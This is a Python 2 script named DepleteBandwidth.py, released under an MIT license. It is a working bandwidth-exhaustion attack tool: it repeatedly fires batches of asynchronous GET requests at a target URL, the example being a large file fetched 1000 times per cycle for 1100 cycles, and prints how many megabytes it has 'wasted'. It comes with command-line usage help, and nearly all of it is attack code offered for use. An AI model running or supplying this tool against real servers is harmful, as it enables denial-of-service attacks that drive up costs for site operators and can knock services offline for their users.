#!/usr/bin/python
# coding: utf-8
'''
The MIT License (MIT)

Copyright (c) 2014 Ahmet Besir Kurtulmus

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

import sys
import time

import grequests


class DepleteBandwidth:
    '''
    Description: Depletes and wastes the bandwidth of the given web server.

    Arguments:
        Url (String type): The target url
        Number of Requests (Integer type): The number of async requests made per iteration
        Number of Cycles (Integer type): The number of iterations of the script execution

    Example:
    >>> DepleteBandwidth("http://example.com/file.zip", 1000, 1100)
    Amount of total bandwidth wasted: 554 MB
    Amount of total bandwidth wasted: 1108 MB
    '''
    def __init__(self, url, number_requests, number_cycles):
        self.url = url
        self.number_requests = number_requests
        self.number_cycles = number_cycles

    def Deplete(self):
        number_requests = int(self.number_requests)

        number_cycles = int(self.number_cycles)

        execute_cooldown = 5

        for i in xrange(number_cycles):

            urls = [self.url] * number_requests

            rs = (grequests.get(u) for u in urls)

            a = grequests.map(rs)

            request_size = len(a[0].text) # In bytes

            del a

            spent_bandwidth = (i + 1) * request_size

            print "Amount of total bandwidth wasted: " + str(spent_bandwidth / (1024 * 1024)) + " MB"

            time.sleep(execute_cooldown)

if (len(sys.argv) == 2) and (sys.argv[1] == "--help"):
    print """\nUSAGE: $ python DepleteBandwidth.py [url] [number_requests] [number_cycles]
    url (String type): The target url
    number_requests (Integer type): The number of async requests made per iteration
    number_cycles (Integer type): The number of iterations of the script execution

EXAMPLE:
	$ python DepleteBandwidth.py http://example.com/file.zip 1000 1100
	"""
elif len(sys.argv) == 4:
    url = sys.argv[1]
    number_requests = sys.argv[2]
    number_cycles = sys.argv[3]

    depleteBandwidth = DepleteBandwidth(url, number_requests, number_cycles)

    depleteBandwidth.Deplete()
else:
    print "\nFor help, type the --help command."
